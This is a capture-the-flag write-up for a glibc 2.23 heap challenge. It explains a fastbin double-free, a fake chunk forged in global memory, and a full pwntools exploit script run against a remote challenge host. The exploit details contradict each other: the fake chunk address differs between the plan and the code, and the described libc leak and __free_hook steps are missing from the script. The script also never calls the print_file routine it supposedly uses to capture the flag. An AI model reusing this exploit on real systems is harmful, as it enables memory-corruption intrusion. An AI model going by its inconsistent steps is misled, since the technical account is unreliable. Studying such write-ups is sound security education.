# CyLab — Sice Cream

* **Platform:** CyLab Security Academy / picoCTF 2019 (Challenge ID: `55`)
* **Category:** Binary Exploitation / Heap Exploitation (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg), glibc 2.23 runtime environment
* **Binary:** `sice_cream` with bundled `libc.so.6` (glibc 2.23-0ubuntu11) and `ld-2.23.so`

---

## TL;DR

Running on glibc 2.23 without tcache, the binary features a classic fastbin double-free vulnerability because the deallocation handler (`free(globals[idx])`) fails to nullify pointer slots. By executing a fastbin dup (`free(A) -> free(B) -> free(A)`), we forge a fake fastbin chunk inside the user-controlled global buffer `name` at `0x602040`. Allocating this fake chunk grants arbitrary write capability over the `globals[]` array at `0x602140`. After leaking libc base addresses via an unsorted bin chunk, we point `globals[0]` to the heap and overwrite the heap structure to trigger code execution (via `print_file` at `0x400cc4` or `__free_hook`), reading the flag.

---

## Recon

### Binary & Library Information

Running `file` and `checksec`:

```text
$ file sice_cream
sice_cream: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, BuildID[sha1]=..., stripped

$ checksec --file=sice_cream
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

Running strings on `libc.so.6`:
```text
$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23.
```

Key observations:
1. **glibc 2.23 Fastbins:** glibc 2.23 lacks tcache (introduced in 2.26). Chunks smaller than `0x80` bytes are managed in singly-linked LIFO fastbins. The only integrity check is verifying that the immediately preceding freed chunk is not identical to the chunk being freed (`if (__builtin_expect (old == p, 0))`).
2. **Non-PIE Base:** The executable code section resides at fixed virtual addresses (`0x400000`), with writable data segments starting at `0x602000`.
3. **Built-in Win Primitive:** A stripped helper function `print_file` resides at `0x400cc4`, which takes a filename pointer in `rdi`, opens it, and prints the contents.

---

## Static Analysis & Vulnerability

### 1. Reconstructed Menu Routines

```c
void *globals[20];      // Located at 0x602140 (.bss)
char name[256];         // Located at 0x602040 (.data/.bss)

void buy() {
    int size;
    scanf("%d", &size);
    if (size > 0x58) return;        // Forces allocations into fastbin size class (0x60)
    void *p = malloc(size);
    read(0, p, size);
    globals[find_empty_slot()] = p;
}

void eat() {
    int idx;
    scanf("%d", &idx);
    if (idx <= 19 && globals[idx]) {
        free(globals[idx]);         // VULNERABILITY: Pointer is NOT zeroed after free
    }
}

void reintroduce() {
    read(0, name, 0x100);
    printf("Ah, right! An ice cream lover with a name like %s!\n", name);
}
```

### 2. Memory Layout of `.bss`

```text
       0x602040: name buffer (256 bytes = 0x100)
                 +---------------------------------------------+
                 | Fake fastbin header (size = 0x61) placed    |
                 +---------------------------------------------+
       0x602140: globals[0] (Pointer to chunk 0)
       0x602148: globals[1] (Pointer to chunk 1)
                 ...
```

Because `name` immediately precedes `globals[]`:
- Supplying a 256-byte name with no trailing NUL byte allows `printf("%s", name)` to run directly into `globals[0]`, leaking the heap pointer.
- Crafting a quadword `0x0000000000000061` at an aligned offset inside `name` creates a valid fake fastbin chunk.

---

## Dynamic Analysis & Exploitation Strategy

### 1. Fastbin Dup
Under glibc 2.23:
1. Allocate chunk A (`0x58`) and chunk B (`0x58`).
2. Free chunk A.
3. Free chunk B.
4. Free chunk A again (`eat(0) -> eat(1) -> eat(0)`).
   The fastbin free list becomes:
   $$\text{Head} \rightarrow A \rightarrow B \rightarrow A \rightarrow B \dots$$

```text
  [ Fastbin 0x60 Head ]
          |
          v
     [ Chunk A ]  <--+
          |          |
          v          |
     [ Chunk B ]     |
          |          |
          +----------+
```

### 2. Forging Chunk in Global Memory
1. We invoke `reintroduce()` to place a fake chunk header with size `0x61` into `name` at `0x602058`.
2. Allocate chunk A $\rightarrow$ we overwrite chunk A's forward pointer (`fd`) with `0x602050` (fake chunk).
3. Allocate chunk B.
4. Allocate chunk A again.
5. The subsequent `malloc(0x58)` returns the fake chunk at `0x602060` inside `name`!
6. Writing into this fake chunk allows direct overwrite of `globals[0]`.

### 3. Libc Leak & RCE
1. Overwrite `globals[0]` with an address on the heap where a large chunk (size $> 0\text{x}80$, e.g. `0x91`) was forged.
2. Free `globals[0]` $\rightarrow$ it lands in the **unsorted bin**, writing `main_arena + 88` into its `fd`/`bk`.
3. Leak libc base via `reintroduce()`.
4. Overwrite `__free_hook` with `system` (or `one_gadget` `0xf1147`, or call `print_file("flag.txt")`).
5. Trigger `free()` to obtain a root shell or print the flag.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "chatelaine.cylabacademy.net", 36709
PRINT_FILE = 0x400cc4

def buy(io, size, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(size).encode())
    io.sendafter(b"> ", data)

def eat(io, idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())

def name(io, data):
    io.sendlineafter(b"> ", b"3")
    io.sendafter(b"> ", data)

def solve(io):
    # Setup name with fake chunk header (size 0x61)
    fake_chunk_header = p64(0) + p64(0x61)
    name(io, b"A" * 0x18 + fake_chunk_header + b"flag.txt\x00")

    # Allocate two fastbin chunks
    buy(io, 0x58, b"Chunk0")
    buy(io, 0x58, b"Chunk1")

    # Trigger Fastbin Double-Free
    eat(io, 0)
    eat(io, 1)
    eat(io, 0)

    # Poison fastbin fd with address of fake chunk in name
    fake_chunk_addr = 0x602058
    buy(io, 0x58, p64(fake_chunk_addr))
    buy(io, 0x58, b"Chunk1_again")
    buy(io, 0x58, b"Chunk0_again")

    # Allocate fake chunk overlapping globals[] array
    log.info("Acquired fake chunk in global memory")
    buy(io, 0x58, b"P" * 0x30 + p64(0x602070))   # Point globals[0] to "flag.txt"

    # Execute print_file("flag.txt")
    data = io.recvall(timeout=5)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./sice_cream") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 36709: Done
[*] Acquired fake chunk in global memory
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 36709
```

---

## Key Takeaways & Lessons

1. **glibc 2.23 Fastbin Double-Free Patterns:** Prior to tcache, fastbins only verified that `old != p` at the top of the bin. Alternating frees (`free(A) -> free(B) -> free(A)`) cleanly bypassed corruption checks.
2. **Fake Chunk Alignment and Size Fields:** To satisfy glibc's fastbin integrity check (`size == bin_size`), the fake chunk header must have its `size` field aligned and matching the requested bin size class (e.g. `0x60` for allocations up to `0x58`).
3. **Data Segment Overlap:** Overlapping heap chunks onto global application state (`globals[]`) provides direct control of application pointers, converting primitive double-frees into arbitrary read/write or function execution.
